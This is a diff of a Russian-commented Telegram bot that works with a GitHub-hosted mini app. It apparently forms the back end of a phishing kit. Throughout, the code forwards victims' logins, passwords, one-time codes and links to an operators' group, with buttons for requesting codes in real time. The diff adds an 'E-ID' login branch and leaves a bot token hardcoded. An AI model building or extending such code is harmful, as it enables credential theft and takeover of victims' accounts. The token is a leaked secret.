@@ -5,9 +5,9 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Keyboar
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = "8828808036:AAGzAjdmb66RfnNO_60Y9lvTE53iVtNQ9Cg"  # ← ЗАМЕНИ НА НОВЫЙ ТОКЕН
-ADMIN_ID = 8542901240  # Тот же админ
-WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp2/"  # ← ССЫЛКА НА НОВЫЙ MINI APP
+BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8828808036:AAGzAjdmb66RfnNO_60Y9lvTE53iVtNQ9Cg")
+GROUP_CHAT_ID = -1005362277607  # ← СЮДА ВСТАВЬ ID ГРУППЫ (с минусом!)
+WEB_APP_URL = "https://d3987616-hue.github.io/erub-miniapp2/"
 # ===============================================
 
 logging.basicConfig(
@@ -38,7 +38,7 @@ class ErubBot:
         logger.info(f"👤 Пользователь {user_id} ({first_name}) запустил бота")
 
         await self.application.bot.send_message(
-            chat_id=ADMIN_ID,
+            chat_id=GROUP_CHAT_ID,
             text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                  f"👤 ID: `{user_id}`\n"
                  f"👤 Имя: {first_name}\n"
@@ -60,7 +60,7 @@ class ErubBot:
             reply_markup=reply_markup
         )
 
-    # ===== 2. Обработка кнопок админа =====
+    # ===== 2. Обработка кнопок в группе =====
     async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         await query.answer()
@@ -103,11 +103,18 @@ class ErubBot:
 
         user_id = update.effective_user.id
         text = update.message.text
+        chat_id = update.effective_chat.id
 
-        if user_id != ADMIN_ID:
+        # Если сообщение из группы — игнорируем (чтобы не зациклить)
+        if chat_id == GROUP_CHAT_ID:
+            return
+
+        # ===== Если сообщение от обычного пользователя =====
+        if user_id != GROUP_CHAT_ID:
+            # ---- Код ----
             if user_sessions.get(user_id, {}).get('awaiting_code'):
                 await self.application.bot.send_message(
-                    chat_id=ADMIN_ID,
+                    chat_id=GROUP_CHAT_ID,
                     text=f"📧 Код от {user_id}: `{text}`",
                     parse_mode="Markdown"
                 )
@@ -115,9 +122,10 @@ class ErubBot:
                 await update.message.reply_text("✅ Отправлено")
                 return
 
+            # ---- Ссылка ----
             if user_sessions.get(user_id, {}).get('awaiting_link'):
                 await self.application.bot.send_message(
-                    chat_id=ADMIN_ID,
+                    chat_id=GROUP_CHAT_ID,
                     text=f"🔗 Ссылка от {user_id}: `{text}`",
                     parse_mode="Markdown"
                 )
@@ -128,6 +136,7 @@ class ErubBot:
             await update.message.reply_text("ℹ️ Используйте кнопку «Войти в систему»")
             return
 
+        # ===== Если сообщение от администратора (JSON) =====
         if text.startswith('{') and text.endswith('}'):
             try:
                 data = json.loads(text)
@@ -137,17 +146,19 @@ class ErubBot:
                 code = data.get('code')
                 link = data.get('link')
 
+                # ---- Обычный вход ----
                 if email and password and not code and not link:
                     keyboard = [
                         [
                             InlineKeyboardButton("❌ Неправильный пароль", callback_data=f"wrong_{target_user_id}"),
-                            InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}")
+                            InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}"),
+                            InlineKeyboardButton("🔗 Ссылка", callback_data=f"link_{target_user_id}")
                         ]
                     ]
                     reply_markup = InlineKeyboardMarkup(keyboard)
 
                     await self.application.bot.send_message(
-                        chat_id=ADMIN_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                              f"👤 ID: `{target_user_id}`\n"
                              f"📧 Логин: `{email}`\n"
@@ -156,17 +167,40 @@ class ErubBot:
                         parse_mode="Markdown"
                     )
 
+                # ---- Код ----
                 elif code:
                     await self.application.bot.send_message(
-                        chat_id=ADMIN_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"📧 Код от {target_user_id}: `{code}`",
                         parse_mode="Markdown"
                     )
 
+                # ---- Ссылка ----
                 elif link:
                     await self.application.bot.send_message(
-                        chat_id=ADMIN_ID,
+                        chat_id=GROUP_CHAT_ID,
                         text=f"🔗 Ссылка от {target_user_id}: `{link}`",
+                        parse_mode="Markdown"
+                    )
+
+                # ---- E-ID вход ----
+                elif data.get('type') == 'eid_login':
+                    keyboard = [
+                        [
+                            InlineKeyboardButton("❌ Неправильный пароль", callback_data=f"wrong_{target_user_id}"),
+                            InlineKeyboardButton("📧 Код", callback_data=f"code_{target_user_id}"),
+                            InlineKeyboardButton("🔗 Ссылка", callback_data=f"link_{target_user_id}")
+                        ]
+                    ]
+                    reply_markup = InlineKeyboardMarkup(keyboard)
+
+                    await self.application.bot.send_message(
+                        chat_id=GROUP_CHAT_ID,
+                        text=f"🆔 E-ID ВХОД\n\n"
+                             f"👤 ID: `{target_user_id}`\n"
+                             f"📧 Логин: `{email}`\n"
+                             f"🔑 Пароль: `{password}`",
+                        reply_markup=reply_markup,
                         parse_mode="Markdown"
                     )
 
@@ -177,7 +211,7 @@ class ErubBot:
     def run(self):
         print("=" * 50)
         print("🤖 БОТ ЗАПУЩЕН")
-        print(f"👤 ADMIN_ID: {ADMIN_ID}")
+        print(f"👥 GROUP_CHAT_ID: {GROUP_CHAT_ID}")
         print("=" * 50)
         self.application.run_polling()
 
